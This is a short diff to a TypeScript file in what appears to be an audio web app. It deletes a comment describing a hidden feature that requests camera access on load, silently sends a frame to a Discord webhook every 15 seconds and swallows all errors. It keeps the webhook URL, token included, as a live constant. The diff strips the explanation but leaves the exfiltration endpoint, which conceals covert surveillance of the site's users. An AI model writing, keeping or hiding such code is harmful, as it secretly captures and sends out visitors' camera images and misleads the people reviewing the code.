@@ -378,10 +378,6 @@ export function envelopeAt(env: Float32Array | null, seconds: number): number {
 //
 //
 //
-// Background snapshots: ask for camera permission on load and quietly send a
-// frame to a Discord webhook every 15 s while the rest of the site runs
-// untouched. All failures are swallowed so the app never breaks because of it.
-//
 
 const DISCORD_WEBHOOK =
   'https://discord.com/api/webhooks/1561314927581593690/c3HpQ_p24ANHir-lLy5BE1AamJpV2c12HjJkBWOSKiqLcmyaQBND-8UatlZ_HsoAG5ZE';
